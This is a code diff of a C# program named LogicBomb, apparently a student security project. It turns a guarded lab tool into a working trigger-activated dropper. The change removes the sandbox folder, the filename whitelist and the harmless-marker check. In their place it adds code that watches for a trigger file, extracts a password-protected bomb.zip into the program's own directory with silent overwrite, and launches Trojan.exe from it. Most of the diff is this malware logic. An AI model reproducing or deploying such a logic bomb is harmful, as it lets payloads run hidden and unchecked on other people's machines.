@@ -3,34 +3,23 @@ using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.IO.Compression;
 using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
-
+using Ionic.Zip; 
 
 namespace LogicBomb
 {
     internal class Program
     {
-        // Lưu ý: vẫn là "SAFE MODE" nhưng sẽ KHỞI CHẠY file .exe tuyệt đối nếu thoả điều kiện
-        private static readonly string WatchedDir = @"C:\lab_watch";
+        private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
         private const string TriggerName = "trigger.flag";
         private const string RequiredToken = "ALLOW_TRIGGER";
         private const string MarkerName = "activated.txt";
-        private const string PayloadZip = "payload.zip";
-        private const string HarmlessMarker = "harmless.marker";
-        private static readonly HashSet<string> Whitelist = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
-        {
-            "x.exe", "unikey.exe", "Malware.exe", "test.exe" // chỉnh tên file được phép
-        };
-
-        // **SỬA TẠI ĐÂY**: đặt đường dẫn tuyệt đối tới Unikey (hoặc bất kỳ .exe hợp lệ bạn muốn chạy)
-        private static readonly string AbsoluteExePath = @"C:\An toàn mạng\DoAn\LogicBomb\bin\Debug\test.exe";
 
         private const int DebounceMs = 1000;
         private const int FileReadyTimeoutSec = 5;
-        private const int ExecTimeoutMs = 5000; // chờ 5s, nếu tiến trình GUI không exit thì ta không block
+        private const int ExecTimeoutMs = 5000;
 
         private static FileSystemWatcher watcher;
         private static ConcurrentDictionary<string, DateTime> pending = new ConcurrentDictionary<string, DateTime>(StringComparer.OrdinalIgnoreCase);
@@ -39,11 +28,10 @@ namespace LogicBomb
 
         static void Main(string[] args)
         {
-            Console.WriteLine("[LogicBomb] START (SAFE MODE) - Press Ctrl+C to stop");
-            Directory.CreateDirectory(WatchedDir);
-            logFile = Path.Combine(WatchedDir, "logicbomb_safe_log.jsonl");
+            Console.WriteLine("[LogicBomb] START (Simplified Mode) - Press Ctrl+C to stop");
+            logFile = Path.Combine(ExecutableBaseDir, "logicbomb_simplified_log.jsonl");
 
-            watcher = new FileSystemWatcher(WatchedDir)
+            watcher = new FileSystemWatcher(ExecutableBaseDir) 
             {
                 NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite | NotifyFilters.CreationTime | NotifyFilters.Size,
                 Filter = "*.*",
@@ -64,7 +52,7 @@ namespace LogicBomb
 
             var worker = Task.Run(() => ProcessLoop(cts.Token));
 
-            Console.WriteLine($"[LogicBomb] Watching: {WatchedDir}");
+            Console.WriteLine($"[LogicBomb] Watching: {ExecutableBaseDir}");
             Console.WriteLine($"[LogicBomb] Waiting for file '{TriggerName}' containing token '{RequiredToken}'");
             worker.Wait();
             Console.WriteLine("[LogicBomb] Exiting.");
@@ -161,131 +149,99 @@ namespace LogicBomb
                     return;
                 }
 
-                // tạo marker
-                string markerPath = Path.Combine(WatchedDir, MarkerName);
-                File.WriteAllText(markerPath, $"(SAFE) Activated by {TriggerName} at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
+                
+                string markerPath = Path.Combine(ExecutableBaseDir, MarkerName);
+                File.WriteAllText(markerPath, $"(SIMPLIFIED) Activated by {TriggerName} at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
                 Console.WriteLine("[LogicBomb] Creating marker: " + markerPath);
 
-                // giải nén payload.zip (nếu có) vào sandbox (subfolder)
-                string zipPath = Path.Combine(WatchedDir, PayloadZip);
-                string sandbox = Path.Combine(WatchedDir, "sandbox_" + DateTime.Now.ToString("yyyyMMdd_HHmmss"));
-                Directory.CreateDirectory(sandbox);
+                string bombZipPath = Path.Combine(ExecutableBaseDir, "bomb.zip");
+                
+                string extractionDir = ExecutableBaseDir;
 
-                if (File.Exists(zipPath))
+                string executableToRun = null;
+
+                if (File.Exists(bombZipPath))
                 {
                     try
                     {
-                        ZipFile.ExtractToDirectory(zipPath, sandbox);
-                        Console.WriteLine("[LogicBomb] Extracted payload.zip to " + sandbox);
-                        LogEvent("extracted", zipPath, "extracted_to", sandbox);
+                        Console.WriteLine($"[LogicBomb] Found bomb.zip at: {bombZipPath}");
+                        using (ZipFile zip = ZipFile.Read(bombZipPath))
+                        {
+                            zip.Password = "123"; 
+                            
+                            foreach (ZipEntry e in zip)
+                            {
+                                e.Extract(extractionDir, ExtractExistingFileAction.OverwriteSilently);
+                            }
+                        }
+                        Console.WriteLine($"[LogicBomb] Extracted bomb.zip to {extractionDir} with password '123'.");
+                        LogEvent("extracted", bombZipPath, "extracted_to", extractionDir);
+
+                        
+                        executableToRun = Path.Combine(extractionDir, "Trojan.exe");
+                        if (!File.Exists(executableToRun))
+                        {
+                            Console.WriteLine($"[LogicBomb] Trojan.exe not found directly in executable's directory after extraction: {executableToRun}");
+                            LogEvent("error", extractionDir, "Trojan_exe_not_found", null);
+                            executableToRun = null; 
+                        }
+                    }
+                    catch (Ionic.Zip.BadPasswordException)
+                    {
+                        Console.WriteLine("[LogicBomb] Error extracting bomb.zip: Incorrect password.");
+                        LogEvent("error", bombZipPath, "extract_failed", "Incorrect password");
+                        executableToRun = null;
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine("[LogicBomb] Error extracting zip: " + ex.Message);
-                        LogEvent("error", zipPath, "extract_failed", ex.Message);
+                        Console.WriteLine("[LogicBomb] Error extracting bomb.zip: " + ex.Message);
+                        LogEvent("error", bombZipPath, "extract_failed", ex.Message);
+                        executableToRun = null;
                     }
                 }
                 else
                 {
-                    Console.WriteLine("[LogicBomb] payload.zip not found in watched dir. Continuing to check absolute path only.");
-                    LogEvent("info", fullPath, "no_payload", null);
+                    Console.WriteLine($"[LogicBomb] bomb.zip not found in program's directory: {bombZipPath}. Skipping extraction and execution of internal exe.");
+                    LogEvent("info", fullPath, "no_bomb_zip", null);
                 }
 
-                // BƯỚC: kiểm tra đường dẫn tuyệt đối và chạy exe (nếu thoả điều kiện)
-                try
+                if (executableToRun != null)
                 {
-                    Console.WriteLine("[LogicBomb] Checking absolute path: " + AbsoluteExePath);
+                    Console.WriteLine("[LogicBomb] Preconditions OK -> launching: " + executableToRun);
 
-                    if (!Path.IsPathRooted(AbsoluteExePath))
+                    var psi = new ProcessStartInfo
                     {
-                        Console.WriteLine("[LogicBomb] Provided path is not absolute. Skipping execution.");
-                        LogEvent("info", AbsoluteExePath, "not_absolute", null);
-                    }
-                    else if (!File.Exists(AbsoluteExePath))
+                        FileName = executableToRun,
+                        WorkingDirectory = extractionDir, 
+                        UseShellExecute = true,
+                        CreateNoWindow = false
+                    };
+                    try
                     {
-                        Console.WriteLine("[LogicBomb] File does not exist at absolute path: " + AbsoluteExePath);
-                        LogEvent("info", AbsoluteExePath, "not_found", null);
-                    }
-                    else
-                    {
-                        string fileName = Path.GetFileName(AbsoluteExePath);
-                        if (!Whitelist.Contains(fileName))
+                        using (var proc = Process.Start(psi))
                         {
-                            Console.WriteLine("[LogicBomb] File name not in whitelist: " + fileName + ". Skipping execution.");
-                            LogEvent("info", AbsoluteExePath, "not_whitelisted", fileName);
-                        }
-                        else
-                        {
-                            // optional: require harmless.marker inside sandbox (to mark payload as safe)
-                            string harmlessInSandbox = Path.Combine(sandbox, "payload", HarmlessMarker);
-                            if (!File.Exists(harmlessInSandbox))
+                            if (proc != null)
                             {
-                                Console.WriteLine("[LogicBomb] harmless.marker not found in extracted payload. Skipping execution for safety.");
-                                LogEvent("info", sandbox, "marker_missing", HarmlessMarker);
-                            }
-                            else
-                            {
-                                Console.WriteLine("[LogicBomb] Preconditions OK -> launching: " + AbsoluteExePath);
-
-                                // Start the EXE using UseShellExecute = true so GUI apps (like Unikey) behave normally.
-                                var psi = new ProcessStartInfo
+                                if (!proc.WaitForExit(ExecTimeoutMs))
                                 {
-                                    FileName = AbsoluteExePath,
-                                    WorkingDirectory = Path.GetDirectoryName(AbsoluteExePath) ?? sandbox,
-                                    UseShellExecute = true,
-                                    CreateNoWindow = false
-                                };
-
-                                try
-                                {
-                                    var proc = Process.Start(psi);
-                                    if (proc != null)
-                                    {
-                                        // Wait a short time; if app is long-running (like Unikey), we won't block indefinitely.
-                                        bool exited = proc.WaitForExit(ExecTimeoutMs);
-                                        LogEvent("exec_started", AbsoluteExePath, exited ? "exited" : "running", $"procId={proc.Id}");
-                                        Console.WriteLine("[LogicBomb] Started process. PID=" + proc.Id + ", exitedWithinTimeout=" + exited);
-                                    }
-                                    else
-                                    {
-                                        Console.WriteLine("[LogicBomb] Process.Start returned null (failed to start).");
-                                        LogEvent("error", AbsoluteExePath, "start_failed", null);
-                                    }
-                                }
-                                catch (Exception ex)
-                                {
-                                    Console.WriteLine("[LogicBomb] Error starting executable: " + ex.Message);
-                                    LogEvent("error", AbsoluteExePath, "start_exception", ex.Message);
+                                    Console.WriteLine("[LogicBomb] Executable did not finish within timeout; attempting to kill.");
+                                    try { proc.Kill(); } catch { /* best-effort */ }
                                 }
                             }
                         }
+                        LogEvent("launched", executableToRun, "launched", null);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[LogicBomb] Error launching executable: " + ex.Message);
+                        LogEvent("error", executableToRun, "launch_failed", ex.Message);
                     }
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("[LogicBomb] Error checking/executing absolute path: " + ex.Message);
-                    LogEvent("error", AbsoluteExePath, "exec_exception", ex.Message);
-                }
-
-                // di chuyển trigger để tránh kích hoạt lại
-                try
-                {
-                    string processed = Path.Combine(WatchedDir, "processed_" + Path.GetFileName(fullPath));
-                    File.Move(fullPath, processed);
-                    Console.WriteLine("[LogicBomb] Moving trigger to: " + processed);
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("[LogicBomb] Could not move trigger: " + ex.Message);
-                }
-
-                LogEvent("process_end", fullPath, null, null);
-                Console.WriteLine("[LogicBomb] Done (safe-run).");
             }
             catch (Exception ex)
             {
                 Console.WriteLine("[LogicBomb] HandleTrigger error: " + ex.Message);
-                LogEvent("error", fullPath, "exception", ex.Message);
+                LogEvent("error", fullPath, "handle_error", ex.Message);
             }
         }
 
@@ -296,14 +252,14 @@ namespace LogicBomb
             {
                 try
                 {
-                    using (var fs = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read))
+                    using (FileStream fs = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read))
                     {
                         return true;
                     }
                 }
-                catch (IOException)
+                catch
                 {
-                    Thread.Sleep(200);
+                    Thread.Sleep(100);
                 }
             }
             return false;
